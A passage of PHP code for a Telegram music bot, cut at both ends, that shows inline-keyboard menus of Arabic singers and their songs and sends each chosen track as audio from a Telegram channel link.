[['text'=>'🎧لو اشوفك ','callback_data'=>"woalah5"],['text'=>'🎧صفر نفسيتي','callback_data'=>"woalah6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song5"]],
]
])
]);
}





if($data=="woalah1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/863",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="woalah2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/864",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="woalah3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/865",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="woalah4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/866",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="woalah5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/867",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="woalah6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/868",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sozbe" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني ساريا سواس 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧بس اسمع مني ','callback_data'=>"sozbe1"],['text'=>' 🎧شلونو شلونو','callback_data'=>"sozbe2"]],
[['text'=>'🎧مظلومة ','callback_data'=>"sozbe3"],['text'=>' 🎧احبك موت','callback_data'=>"sozbe4"]],
[['text'=>'🎧صرخه وجع ','callback_data'=>"sozbe5"],['text'=>'🎧ياريتك','callback_data'=>"sozbe6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song5"]],
]
])
]);
}



if($data=="sozbe1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/857",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sozbe2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/858",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sozbe3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/859",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sozbe4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/860",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sozbe5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/861",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sozbe6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/862",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}


if($data=="sjsjkjwl" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني جورج وسوف 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧سهرت الليل ','callback_data'=>"sjsjkjwl1"],['text'=>' 🎧الحبايب','callback_data'=>"sjsjkjwl2"]],
[['text'=>'🎧حلف القمر ','callback_data'=>"sjsjkjwl3"],['text'=>' 🎧جرحونا','callback_data'=>"sjsjkjwl4"]],
[['text'=>'🎧اللي أديتهم زماني ','callback_data'=>"sjsjkjwl5"],['text'=>'🎧جانا الهوي','callback_data'=>"sjsjkjwl6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song5"]],
]
])
]);
}



if($data=="sjsjkjwl1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/851",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjsjkjwl2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/852",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjsjkjwl3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/853",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjsjkjwl4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/854",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjsjkjwl5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/855",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjsjkjwl6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/856",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}


if($data=="yjkam" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني صباح الفخري 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧قداك المياس ','callback_data'=>"yjkam1"],['text'=>' 🎧خمره الحب','callback_data'=>"yjkam2"]],
[['text'=>'🎧ابعتلي جواب ','callback_data'=>"yjkam3"],['text'=>' 🎧فوق النخل','callback_data'=>"yjkam4"]],
[['text'=>'🎧خمره الحب 2 ','callback_data'=>"yjkam5"],['text'=>'🎧ملكتم فؤادي','callback_data'=>"yjkam6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song5"]],
]
])
]);
}


if($data=="yjkam1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/845",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="yjkam2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/846",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="yjkam3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/847",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="yjkam4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/848",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="yjkam5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/849",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="yjkam6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/850",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}


if($data=="krlak" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني حسين الديك 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧انا الملك  ','callback_data'=>"krlak1"],['text'=>' 🎧محلاكي','callback_data'=>"krlak2"]],
[['text'=>'🎧تعي ','callback_data'=>"krlak3"],['text'=>' 🎧معك عالموت','callback_data'=>"krlak4"]],
[['text'=>'🎧غيرك ما بختار ','callback_data'=>"krlak5"],['text'=>'🎧جمالك ما بيخلص','callback_data'=>"krlak6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song5"]],
]
])
]);
}


if($data=="krlak1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/839",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="krlak2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/840",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="krlak3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/841",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="krlak4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/842",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="krlak5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/843",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="krlak6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/844",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sollta" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني بهاء اليوسف 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧دبكات  ','callback_data'=>"sollta1"],['text'=>' 🎧لحالي احلالي','callback_data'=>"sollta2"]],
[['text'=>'🎧الورد الجوري ','callback_data'=>"sollta3"],['text'=>' 🎧عرب','callback_data'=>"sollta4"]],
[['text'=>'🎧اموت بعدك ','callback_data'=>"sollta5"],['text'=>'🎧هاتي عيونك','callback_data'=>"sollta6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song5"]],
]
])
]);
}


if($data=="sollta1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/833",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sollta2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/834",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sollta3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/835",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sollta4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/836",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sollta5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/837",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sollta6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/838",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="diiik" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني علي الديك 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧طفران  ','callback_data'=>"diiik1"],['text'=>' 🎧لمجانين','callback_data'=>"diiik2"]],
[['text'=>'🎧علوش ','callback_data'=>"diiik3"],['text'=>' 🎧حسنا','callback_data'=>"diiik4"]],
[['text'=>'🎧لعيونك ','callback_data'=>"diiik5"],['text'=>'🎧القالب غالب','callback_data'=>"diiik6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song5"]],
]
])
]);
}


if($data=="diiik1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/827",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="diiik2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/828",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="diiik3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/829",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="diiik4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/830",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="diiik5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/831",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="diiik6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/832",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}


if($data=="norzuj" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني فيصل نور الزين 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧الخلقه نار ','callback_data'=>"norzuj1"],['text'=>' 🎧ثكيل','callback_data'=>"norzuj2"]],
[['text'=>'🎧متعجب ','callback_data'=>"norzuj3"],['text'=>' 🎧الذاكره','callback_data'=>"norzuj4"]],
[['text'=>'🎧موتتني الفركه ','callback_data'=>"norzuj5"],['text'=>'🎧اطك روحي','callback_data'=>"norzuj6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song4"]],
]
])
]);
}


if($data=="norzuj1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/821",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="norzuj2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/822",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="norzuj3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/823",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="norzuj4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/824",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="norzuj5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/825",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="norzuj6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/826",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}



if($data=="song4" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر مغنيك 🎧
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'احلام وهبي 🎧','callback_data'=>"wlalan"],['text'=>'كاظم الساهر 🎧','callback_data'=>"sjwka"]],
[['text'=>'اسراء الاصيل  🎧','callback_data'=>"bxska"],['text'=>'ياس خضر 🎧','callback_data'=>"skalak"]],
[['text'=>'بلقيس فالح 🎧','callback_data'=>"alalsm"],['text'=>'جاسم الخياط 🎧','callback_data'=>"rjeksa"]],
[['text'=>'رباب 🎧','callback_data'=>"qlsnss"],['text'=>'فيصل عبدالكريم 🎧','callback_data'=>"akqla"]],
 [['text'=>'نور الزين 🎧 ','callback_data'=>"norzuj"]],
 [['text'=>'سورس ويزرد ™','url'=>'t.me/wizard_system']],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song"]],
]
])
]);
}


if($data=="akqla" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني فيصل عبد الكريم 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧لا تتوقع ','callback_data'=>"akqla1"],['text'=>' 🎧عشق','callback_data'=>"akqla2"]],
[['text'=>'🎧ازمه ','callback_data'=>"akqla3"],['text'=>' 🎧شفت يا قلبي','callback_data'=>"akqla4"]],
[['text'=>'🎧 ما فيني شي ','callback_data'=>"akqla5"],['text'=>'🎧هاي النهايه','callback_data'=>"akqla6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song4"]],
]
])
]);
}


if($data=="akqla1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/815",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="akqla2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/816",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="akqla3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/817",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="akqla4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/818",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="akqla5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/819",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="akqla6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/820",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}


if($data=="rjeksa" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني جاسم الخياط 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧ماريد المايردوني ','callback_data'=>"rjeksa1"],['text'=>' 🎧ابو الكصيبه','callback_data'=>"rjeksa2"]],
[['text'=>'🎧اربع حروف بغصن عمري اكتبت ','callback_data'=>"rjeksa3"],['text'=>' 🎧كذاب','callback_data'=>"rjeksa4"]],
[['text'=>'🎧 سعديه ','callback_data'=>"rjeksa5"],['text'=>'🎧خدري الجاي خدري','callback_data'=>"rjeksa6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song4"]],
]
])
]);
}


if($data=="rjeksa1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/809",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="rjeksa2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/810",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="rjeksa3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/811",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="rjeksa4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/812",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="rjeksa5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/813",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="rjeksa6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/814",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}



if($data=="skalak" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني ياس خضر 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧هم رجع قلبي يحن ','callback_data'=>"skalak1"],['text'=>' 🎧شبيهه الناس','callback_data'=>"skalak2"]],
[['text'=>'🎧مجروحين ','callback_data'=>"skalak3"],['text'=>' 🎧مسافرين','callback_data'=>"skalak4"]],
[['text'=>'🎧تايبين ','callback_data'=>"skalak5"],['text'=>'🎧اه يا ليل','callback_data'=>"skalak6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song4"]],
]
])
]);
}


if($data=="skalak1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/803",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="skalak2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/804",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="skalak3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/805",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="skalak4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/806",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="skalak5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/807",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="skalak6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/808",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}




if($data=="sjwka" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني كاظم الساهر 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧هل نسيت العهد   ','callback_data'=>"sjwka1"],['text'=>' 🎧علمني حبك','callback_data'=>"sjwka2"]],
[['text'=>'🎧كتاب الحب ','callback_data'=>"sjwka3"],['text'=>' 🎧تناقضات','callback_data'=>"sjwka4"]],
[['text'=>'🎧 يدك التي حطت علي كتفي ','callback_data'=>"sjwka5"],['text'=>'🎧المستبدة','callback_data'=>"sjwka6"]],
[['text'=>'🎧قولي احبك ','callback_data'=>"sjwka7"],['text'=>'🎧احتمال انسي حبك ','callback_data'=>"sjwka8"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song4"]],
]
])
]);
}


if($data=="sjwka1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/795",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjwka2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/796",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjwka3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/797",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjwka4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/798",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjwka5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/799",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjwka6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/800",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sjwka7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/801",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sjwka8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/802",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}


if($data=="qlsnss" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني رباب 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧جبرني الشوق  ','callback_data'=>"qlsnss1"],['text'=>' 🎧أرجوك أرجوك','callback_data'=>"qlsnss2"]],
[['text'=>'🎧اجرح وعذب علي ما تشتهي ','callback_data'=>"qlsnss3"],['text'=>' 🎧انت بديت','callback_data'=>"qlsnss4"]],
[['text'=>'🎧وينك سألنا عليك ','callback_data'=>"qlsnss5"],['text'=>'🎧احتمال انسي حبك ','callback_data'=>"qlsnss6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song4"]],
]
])
]);
}



if($data=="qlsnss1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/788",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="qlsnss2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/789",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="qlsnss3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/790",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="qlsnss4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/791",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="qlsnss5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/792",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="qlsnss6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/793",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="alalsm" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني بلقيس فالح 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧بين قلبينا  ','callback_data'=>"alalsm1"],['text'=>' 🎧اين انت الان عني','callback_data'=>"alalsm2"]],
[['text'=>'🎧 ربيتك صغيرون حسن ','callback_data'=>"alalsm3"],['text'=>' 🎧للأب القائد','callback_data'=>"alalsm4"]],
[['text'=>'🎧سلم عليه ','callback_data'=>"alalsm5"],['text'=>'🎧 خايف اخر كلمه وياه ','callback_data'=>"alalsm6"]],
